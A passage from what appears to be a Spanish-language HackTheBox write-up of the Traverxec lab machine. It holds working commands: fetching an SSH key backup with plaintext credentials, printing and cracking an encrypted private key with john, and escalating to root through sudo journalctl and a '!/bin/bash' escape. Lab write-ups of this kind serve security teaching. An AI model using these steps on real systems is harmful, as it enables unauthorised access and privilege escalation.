+&lt;meta http-equiv<span class=o>=</span><span class=s2>&#34;content-type&#34;</span> <span class=nv>content</span><span class=o>=</span><span class=s2>&#34;text/html; charset=iso-8859-1&#34;</span>&gt;
+&lt;/head&gt;
+&lt;body&gt;
+
+&lt;h1&gt;301 Moved Permanently&lt;/h1&gt;
+
+&lt;hr&gt;
+&lt;address&gt;nostromo 1.9.6 at 10.10.10.165 Port 80&lt;/address&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre></td></tr></table>
+</div>
+</div><p>Dentro de la carpeta <code>protected-file-area</code> podemos ver un archivo comprimido:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>www-data@traverxec:/home/david/public_www/protected-file-area$ ls
+backup-ssh-identity-files.tgz
+</code></pre></td></tr></table>
+</div>
+</div><p>Si intentamos ir a este directorio con el servicio web, podemos ver una respuesta <code>401 Unauthorized</code>, por lo que necesitamos unas credenciales válidas para autenticarnos en el servicio web usando la URL:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>❯ curl 10.10.10.165/~david/protected-file-area/
+&lt;!DOCTYPE HTML PUBLIC <span class=s2>&#34;-//W3C//DTD HTML 4.01 Transitional//EN&#34;</span>&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;401 Unauthorized&lt;/title&gt;
+&lt;meta http-equiv<span class=o>=</span><span class=s2>&#34;content-type&#34;</span> <span class=nv>content</span><span class=o>=</span><span class=s2>&#34;text/html; charset=iso-8859-1&#34;</span>&gt;
+&lt;/head&gt;
+&lt;body&gt;
+
+&lt;h1&gt;401 Unauthorized&lt;/h1&gt;
+
+&lt;hr&gt;
+&lt;address&gt;nostromo 1.9.6 at 10.10.10.165 Port 80&lt;/address&gt;
+&lt;/body&gt;
+&lt;/html&gt;         
+</code></pre></td></tr></table>
+</div>
+</div><p>Podemos transferir este archivo con wget o curl siempre que nos autentiquemos en el servicio:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>wget http://david:Nowonly4me@10.10.10.165/~david/protected-file-area/backup-ssh-identity-files.tgz
+curl http://david:Nowonly4me@10.10.10.165/~david/protected-file-area/backup-ssh-identity-files.tgz --output backup-ssh-identity-files.tgz
+</code></pre></td></tr></table>
+</div>
+</div><p>Luego podemos descomprimir su contenido:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>❯ tar -xvf backup-ssh-identity-files.tgz
+home/david/.ssh/
+home/david/.ssh/authorized_keys
+home/david/.ssh/id_rsa
+home/david/.ssh/id_rsa.pub
+</code></pre></td></tr></table>
+</div>
+</div><p>Hay algunas claves de SSH. Podemos intentar validar si estos pares de claves SSH están autorizados por el servidor verificando si la clave pública <code>id_rsa.pub</code> está en el archivo<code> authorized_keys</code>:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>❯ cat id_rsa.pub
+
+───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: id_rsa.pub
+───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   <span class=m>1</span>   │ ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCsXrsMQc0U71GVXMQcTOYIH2ZvCwpxTxN1jOYbTutvNyYThEIjYpCVs5DKhZi2rNunI8Z+Ey/FC9bpmCiJtao0xxIbJ02c+H6q13aAFrTv61GAzi5neX4Lj2E/pIhd3JBFYRIQw97C
+       │ 66MO3UVqxKcnGrCvYnhJvKMw7nSRI/cXTPHAEnwU0+NW2zBKId8cRRLxGFyM49pjDZPsAVgGlfdBD380vVa9dMrJ/T13vDTZZGoDgcq9gRtD1B6NJoLHaRWH4ikRuQvLWjk3nWDDaRjw6MxmRtLk8h0MM7+IiBYc6NJvbQzpG5M5oM0F
+       │ vhawQetN71KcZ4jUVxN3m+YkaqHD david@traverxec
+───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+❯
+❯ cat authorized_keys
+───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: authorized_keys
+───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   <span class=m>1</span>   │ ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCsXrsMQc0U71GVXMQcTOYIH2ZvCwpxTxN1jOYbTutvNyYThEIjYpCVs5DKhZi2rNunI8Z+Ey/FC9bpmCiJtao0xxIbJ02c+H6q13aAFrTv61GAzi5neX4Lj2E/pIhd3JBFYRIQw97C
+       │ 66MO3UVqxKcnGrCvYnhJvKMw7nSRI/cXTPHAEnwU0+NW2zBKId8cRRLxGFyM49pjDZPsAVgGlfdBD380vVa9dMrJ/T13vDTZZGoDgcq9gRtD1B6NJoLHaRWH4ikRuQvLWjk3nWDDaRjw6MxmRtLk8h0MM7+IiBYc6NJvbQzpG5M5oM0F
+       │ vhawQetN71KcZ4jUVxN3m+YkaqHD david@traverxec
+───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+❯ diff id_rsa.pub authorized_keys
+</code></pre></td></tr></table>
+</div>
+</div><p>Como podemos ver arriba, la clave pública SSH está en el archivo <code>authorized_keys</code>, esto significa que podemos usar la clave privada para autenticarnos en el servicio SSH, pero primero necesitamos descifrar la clave privada SSH ya que está encriptada:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>❯ cat id_rsa
+───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: id_rsa
+───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   <span class=m>1</span>   │ -----BEGIN RSA PRIVATE KEY-----
+   <span class=m>2</span>   │ Proc-Type: 4,ENCRYPTED
+   <span class=m>3</span>   │ DEK-Info: AES-128-CBC,477EEFFBA56F9D283D349033D5D08C4F
+   <span class=m>4</span>   │
+   <span class=m>5</span>   │ seyeH/feG19TlUaMdvHZK/2qfy8pwwdr9sg75x4hPpJJ8YauhWorCN4LPJV+wfCG
+   <span class=m>6</span>   │ tuiBPfZy+ZPklLkOneIggoruLkVGW4k4651pwekZnjsT8IMM3jndLNSRkjxCTX3W
+   <span class=m>7</span>   │ KzW9VFPujSQZnHM9Jho6J8O8LTzl+s6GjPpFxjo2Ar2nPwjofdQejPBeO7kXwDFU
+   <span class=m>8</span>   │ RJUpcsAtpHAbXaJI9LFyX8IhQ8frTOOLuBMmuSEwhz9KVjw2kiLBLyKS+sUT9/V7
+   <span class=m>9</span>   │ HHVHW47Y/EVFgrEXKu0OP8rFtYULQ+7k7nfb7fHIgKJ/6QYZe69r0AXEOtv44zIc
+  <span class=m>10</span>   │ Y1OMGryQp5CVztcCHLyS/9GsRB0d0TtlqY2LXk+1nuYPyyZJhyngE7bP9jsp+hec
+  <span class=m>11</span>   │ dTRqVqTnP7zI8GyKTV+KNgA0m7UWQNS+JgqvSQ9YDjZIwFlA8jxJP9HsuWWXT0ZN
+  <span class=m>12</span>   │ 6pmYZc/rNkCEl2l/oJbaJB3jP/1GWzo/q5JXA6jjyrd9xZDN5bX2E2gzdcCPd5qO
+  <span class=m>13</span>   │ xwzna6js2kMdCxIRNVErnvSGBIBS0s/OnXpHnJTjMrkqgrPWCeLAf0xEPTgktqi1
+  <span class=m>14</span>   │ Q2IMJqhW9LkUs48s+z72eAhl8naEfgn+fbQm5MMZ/x6BCuxSNWAFqnuj4RALjdn6
+  <span class=m>15</span>   │ i27gesRkxxnSMZ5DmQXMrrIBuuLJ6gHgjruaCpdh5HuEHEfUFqnbJobJA3Nev54T
+  <span class=m>16</span>   │ fzeAtR8rVJHlCuo5jmu6hitqGsjyHFJ/hSFYtbO5CmZR0hMWl1zVQ3CbNhjeIwFA
+  <span class=m>17</span>   │ bzgSzzJdKYbGD9tyfK3z3RckVhgVDgEMFRB5HqC+yHDyRb+U5ka3LclgT1rO+2so
+  <span class=m>18</span>   │ uDi6fXyvABX+e4E4lwJZoBtHk/NqMvDTeb9tdNOkVbTdFc2kWtz98VF9yoN82u8I
+  <span class=m>19</span>   │ Ak/KOnp7lzHnR07dvdD61RzHkm37rvTYrUexaHJ458dHT36rfUxafe81v6l6RM8s
+  <span class=m>20</span>   │ 9CBrEp+LKAA2JrK5P20BrqFuPfWXvFtROLYepG9eHNFeN4uMsuT/55lbfn5S41/U
+  <span class=m>21</span>   │ rGw0txYInVmeLR0RJO37b3/haSIrycak8LZzFSPUNuwqFcbxR8QJFqqLxhaMztua
+  <span class=m>22</span>   │ 4mOqrAeGFPP8DSgY3TCloRM0Hi/MzHPUIctxHV2RbYO/6TDHfz+Z26ntXPzuAgRU
+  <span class=m>23</span>   │ /8Gzgw56EyHDaTgNtqYadXruYJ1iNDyArEAu+KvVZhYlYjhSLFfo2yRdOuGBm9AX
+  <span class=m>24</span>   │ JPNeaxw0DX8UwGbAQyU0k49ePBFeEgQh9NEcYegCoHluaqpafxYx2c5MpY1nRg8+
+  <span class=m>25</span>   │ XBzbLF9pcMxZiAWrs4bWUqAodXfEU6FZv7dsatTa9lwH04aj/5qxEbJuwuAuW5Lh
+  <span class=m>26</span>   │ hORAZvbHuIxCzneqqRjS4tNRm0kF9uI5WkfK1eLMO3gXtVffO6vDD3mcTNL1pQuf
+  <span class=m>27</span>   │ SP0GqvQ1diBixPMx+YkiimRggUwcGnd3lRBBQ2MNwWt59Rri3Z4Ai0pfb1K7TvOM
+  <span class=m>28</span>   │ j1aQ4bQmVX8uBoqbPvW0/oQjkbCvfR4Xv6Q+cba/FnGNZxhHR8jcH80VaNS469tt
+  <span class=m>29</span>   │ VeYniFU/TGnRKDYLQH2x0ni1tBf0wKOLERY0CbGDcquzRoWjAmTN/PV2VbEKKD/w
+  <span class=m>30</span>   │ -----END RSA PRIVATE KEY-----
+───────┴─────────────────────────────────
+</code></pre></td></tr></table>
+</div>
+</div><p>Podemos usar ssh2john para descifrar la clave privada de SSH:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>❯ find / -name ssh2john.py 2&gt;/dev/null
+/usr/share/john/ssh2john.py
+❯ python /usr/share/john/ssh2john.py id_rsa &gt; id_rsa.john
+❯ john --wordlist<span class=o>=</span>/usr/share/wordlists/rockyou.txt id_rsa.john
+Using default input encoding: UTF-8
+Loaded <span class=m>1</span> password <span class=nb>hash</span> <span class=o>(</span>SSH <span class=o>[</span>RSA/DSA/EC/OPENSSH <span class=o>(</span>SSH private keys<span class=o>)</span> 32/64<span class=o>])</span>
+Cost <span class=m>1</span> <span class=o>(</span>KDF/cipher <span class=o>[</span><span class=nv>0</span><span class=o>=</span>MD5/AES <span class=nv>1</span><span class=o>=</span>MD5/3DES <span class=nv>2</span><span class=o>=</span>Bcrypt/AES<span class=o>])</span> is <span class=m>0</span> <span class=k>for</span> all loaded hashes
+Cost <span class=m>2</span> <span class=o>(</span>iteration count<span class=o>)</span> is <span class=m>1</span> <span class=k>for</span> all loaded hashes
+Will run <span class=m>4</span> OpenMP threads
+Note: This format may emit <span class=nb>false</span> positives, so it will keep trying even after
+finding a possible candidate.
+Press <span class=s1>&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class=k>for</span> status
+hunter           <span class=o>(</span>id_rsa<span class=o>)</span>
+Warning: Only <span class=m>2</span> candidates left, minimum <span class=m>4</span> needed <span class=k>for</span> performance.
+1g 0:00:00:02 DONE <span class=o>(</span>2021-10-17 19:10<span class=o>)</span> 0.4694g/s 6733Kp/s 6733Kc/s 6733KC/sa6_123..*7¡Vamos!
+Session completed
+</code></pre></td></tr></table>
+</div>
+</div><p>La contraseña es <code>hunter</code>, por lo que ahora podemos descifrar esta clave y crear una copia de la clave que no está protegida por esta contraseña:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>❯ openssl rsa -in id_rsa -out id_rsa_david
+Enter pass phrase <span class=k>for</span> id_rsa:
+writing RSA key
+</code></pre></td></tr></table>
+</div>
+</div><p>Alternativamente, pero no se recomienda, ya que no tendrá una copia de la clave descifrada, es simplemente ingresar la frase de la contraseña cuando se le solicite:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>ssh -i id_rsa david@10.10.10.165
+</code></pre></td></tr></table>
+</div>
+</div><h2 id=shell-via-ssh>Shell via SSH</h2>
+<p>Ahora que tenemos la clave privada descifrada, podemos usarla para autenticarnos en el servicio SSH como el usuario david:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>❯ ssh -i id_rsa_david david@10.10.10.165
+The authenticity of host <span class=s1>&#39;10.10.10.165 (10.10.10.165)&#39;</span> can<span class=s1>&#39;t be established.
+</span><span class=s1>ECDSA key fingerprint is SHA256:CiO/pUMzd+6bHnEhA2rAU30QQiNdWOtkEPtJoXnWzVo.
+</span><span class=s1>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span><span class=s1>Warning: Permanently added &#39;</span>10.10.10.165<span class=err>&#39;</span> <span class=o>(</span>ECDSA<span class=o>)</span> to the list of known hosts.
+Linux traverxec 4.19.0-6-amd64 <span class=c1>#1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64</span>
+david@traverxec:~$ id
+<span class=nv>uid</span><span class=o>=</span>1000<span class=o>(</span>david<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>1000<span class=o>(</span>david<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>1000<span class=o>(</span>david<span class=o>)</span>,24<span class=o>(</span>cdrom<span class=o>)</span>,25<span class=o>(</span>floppy<span class=o>)</span>,29<span class=o>(</span>audio<span class=o>)</span>,30<span class=o>(</span>dip<span class=o>)</span>,44<span class=o>(</span>video<span class=o>)</span>,46<span class=o>(</span>plugdev<span class=o>)</span>,109<span class=o>(</span>netdev<span class=o>)</span>
+david@traverxec:~$ cut -c-5 user.txt
+7db0b
+</code></pre></td></tr></table>
+</div>
+</div><h1 id=escalada-de-privilegios-david---root>Escalada de Privilegios: david -> root</h1>
+<h2 id=enumeración>Enumeración</h2>
+<p>Podemos comenzar enumerando la carpeta de inicio del usuario actual:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>david@traverxec:~$ ls -lahR
+&lt;...snip...&gt;
+david@traverxec:~$ cat bin/server-stats.sh
+<span class=c1>#!/bin/bash</span>
+
+cat /home/david/bin/server-stats.head
+<span class=nb>echo</span> <span class=s2>&#34;Load: `/usr/bin/uptime`&#34;</span>
+<span class=nb>echo</span> <span class=s2>&#34; &#34;</span>
+<span class=nb>echo</span> <span class=s2>&#34;Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`&#34;</span>
+<span class=nb>echo</span> <span class=s2>&#34;Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`&#34;</span>
+<span class=nb>echo</span> <span class=s2>&#34; &#34;</span>
+<span class=nb>echo</span> <span class=s2>&#34;Last 5 journal log lines:&#34;</span>
+/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service <span class=p>|</span> /usr/bin/cat
+</code></pre></td></tr></table>
+</div>
+</div><p>Hay un script que ejecuta sudo en el programa journalctl.</p>
+<h2 id=abusando-journalctl>Abusando journalctl</h2>
+<p>Si buscamos journalctl en gtfobins (lea gtfobins), hay una opción para sudo. Es bastante breve y simplemente dice:</p>
+<pre><code>sudo journalctl !/bin/sh
+</code></pre>
+<p>El journalctl saldrá a stdout si la cantidad de líneas verticales puede caber en la página actual, de lo contrario, entrará en &ldquo;less&rdquo; si no puede. Podemos probar esto en nuestro localhost:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>sudo journalctl
+</code></pre></td></tr></table>
+</div>
+</div><p>Como puedes ver ahora estamos en &ldquo;less&rdquo;:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>sep <span class=m>09</span> 20:49:55 parrot kernel: MTRR default type: uncachable
+sep <span class=m>09</span> 20:49:55 parrot kernel: MTRR fixed ranges enabled:
+sep <span class=m>09</span> 20:49:55 parrot kernel:   00000-9FFFF write-back
+lines 1-39
+</code></pre></td></tr></table>
+</div>
+</div><p>En el comando journalctl podemos ver el parámetro <code>-n</code> que toma <code>5</code> líneas como argumento, esto significa que solo se enviarán cinco líneas a la salida, por lo que necesitamos reducir la terminal a algo más pequeño que 5 líneas, y seremos enviados a less como el usuario root porque se esta ejecutando con sudo. Probemos esto en nuestro host primero para ver cómo funciona:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>sudo journalctl -n <span class=m>5</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>No olvidemos cambiar el tamaño de la terminal (verticalmente).</p>
+<p>Sabiendo esto, podemos intentar escalar los privilegios con el comando que se muestra en GTFOBins:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>david@traverxec:~$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
+-- Logs begin at Sun 2021-10-17 18:09:21 EDT, end at Sun 2021-10-17 19:25:33 EDT. --
+Oct <span class=m>17</span> 18:34:04 traverxec sudo<span class=o>[</span>3841<span class=o>]</span>: pam_unix<span class=o>(</span>sudo:auth<span class=o>)</span>: authentication failure<span class=p>;</span> <span class=nv>logname</span><span class=o>=</span> <span class=nv>uid</span><span class=o>=</span><span class=m>33</span> <span class=nv>euid</span><span class=o>=</span><span class=m>0</span> <span class=nv>tty</span><span class=o>=</span> <span class=nv>ruser</span><span class=o>=</span>www-data <span class=nv>rhost</span><span class=o>=</span>  <span class=nv>user</span><span class=o>=</span>www-data
+Oct <span class=m>17</span> 18:34:06 traverxec sudo<span class=o>[</span>3841<span class=o>]</span>: pam_unix<span class=o>(</span>sudo:auth<span class=o>)</span>: conversation failed
+Oct <span class=m>17</span> 18:34:06 traverxec sudo<span class=o>[</span>3841<span class=o>]</span>: pam_unix<span class=o>(</span>sudo:auth<span class=o>)</span>: auth could not identify password <span class=k>for</span> <span class=o>[</span>www-data<span class=o>]</span>
+!/bin/bash
+root@traverxec:/home/david# id
+<span class=nv>uid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span>
+root@traverxec:/home/david# <span class=nb>cd</span> /root
+root@traverxec:~# ls
+nostromo_1.9.6-1.deb  root.txt
+root@traverxec:~# cut -c-5 root.txt
+9aa36
+</code></pre></td></tr></table>
+</div>
+</div><p>Alternativamente, podemos configurar las filas stty para que tengan menos de 5 filas (líneas verticales):</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>david@traverxec:~$ stty rows <span class=m>1</span>
+david@traverxec:~$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
+!/bin/bash
+root@traverxec:/home/david# id
+<span class=nv>uid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span>
+root@traverxec:/home/david#
+</code></pre></td></tr></table>
+</div>
+</div></div><div class=post-footer id=post-footer>
+<div class=post-info>
+<div class=post-info-line>
+<div class=post-info-mod>
+<span>Actualizado el 2021-10-22</span>
+</div>
+<div class=post-info-license></div>
+</div>
+<div class=post-info-line>
+<div class=post-info-md><span>
+<a class=link-to-markdown href=/es/htb_traverxec/index.md target=_blank>Leer Markdown</a>
+</span></div>
+<div class=post-info-share>
+<span><a href=javascript:void(0); title="Compartir en Twitter" data-sharer=twitter data-url=https://wixnic.github.io/es/htb_traverxec/ data-title="HackTheBox - Traverxec" data-via=wixnic data-hashtags=youtube,nostromo,searchsploit,htaccess,htpasswd,linpeas,hashcat,john,ssh-private-keys,gtfobins,journalctl,wget,curl,python><i class="fab fa-twitter fa-fw"></i></a><a href=javascript:void(0); title="Compartir en Facebook" data-sharer=facebook data-url=https://wixnic.github.io/es/htb_traverxec/ data-hashtag=youtube><i class="fab fa-facebook-square fa-fw"></i></a><a href=javascript:void(0); title="Compartir en Hacker News" data-sharer=hackernews data-url=https://wixnic.github.io/es/htb_traverxec/ data-title="HackTheBox - Traverxec"><i class="fab fa-hacker-news fa-fw"></i></a><a href=javascript:void(0); title="Compartir en Line" data-sharer=line data-url=https://wixnic.github.io/es/htb_traverxec/ data-title="HackTheBox - Traverxec"><i data-svg-src=https://cdn.jsdelivr.net/npm/simple-icons@2.14.0/icons/line.svg></i></a><a href=javascript:void(0); title="Compartir en 微博" data-sharer=weibo data-url=https://wixnic.github.io/es/htb_traverxec/ data-title="HackTheBox - Traverxec" data-image=/images/thumbnails/HTB-Thumbnail-Traverxec-Spanish.png><i class="fab fa-weibo fa-fw"></i></a></span>
+</div>
+</div>
+</div>
+<div class=post-info-more>
+<section class=post-tags><i class="fas fa-tags fa-fw"></i>&nbsp;<a href=/es/tags/youtube/>youtube</a>,&nbsp;<a href=/es/tags/nostromo/>nostromo</a>,&nbsp;<a href=/es/tags/searchsploit/>searchsploit</a>,&nbsp;<a href=/es/tags/htaccess/>htaccess</a>,&nbsp;<a href=/es/tags/htpasswd/>htpasswd</a>,&nbsp;<a href=/es/tags/linpeas/>linpeas</a>,&nbsp;<a href=/es/tags/hashcat/>hashcat</a>,&nbsp;<a href=/es/tags/john/>john</a>,&nbsp;<a href=/es/tags/ssh-private-keys/>ssh-private-keys</a>,&nbsp;<a href=/es/tags/gtfobins/>gtfobins</a>,&nbsp;<a href=/es/tags/journalctl/>journalctl</a>,&nbsp;<a href=/es/tags/wget/>wget</a>,&nbsp;<a href=/es/tags/curl/>curl</a>,&nbsp;<a href=/es/tags/python/>python</a></section>
+<section>
+<span><a href=javascript:void(0); onclick=window.history.back()>Regresar</a></span>&nbsp;|&nbsp;<span><a href=/es/>Inicio</a></span>
+</section>
+</div>
+<div class=post-nav></div>
+</div>
+<div id=comments><div id=valine class=comment></div><noscript>
+Please enable JavaScript to view the comments powered by <a href=https://valine.js.org/>Valine</a>.
+</noscript></div></article></div>
+</main><footer class=footer>
+<div class=footer-container><div class=footer-line>Provisto por <a href=https://gohugo.io/ target=_blank rel="noopener noreffer" title="Hugo 0.90.0">Hugo</a> | Tema - <a href=https://github.com/dillonzq/LoveIt target=_blank rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
+</div><div class=footer-line><i class="far fa-copyright fa-fw"></i><span itemprop=copyrightYear>2019 - 2021</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/es/ target=_blank>wixnic</a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div>
+</div>
+</footer></div>
+<div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Volver arriba">
+<i class="fas fa-arrow-up fa-fw"></i>
+</a><a href=# id=view-comments class=fixed-button title="Ver comentarios">
+<i class="fas fa-comment fa-fw"></i>
+</a>
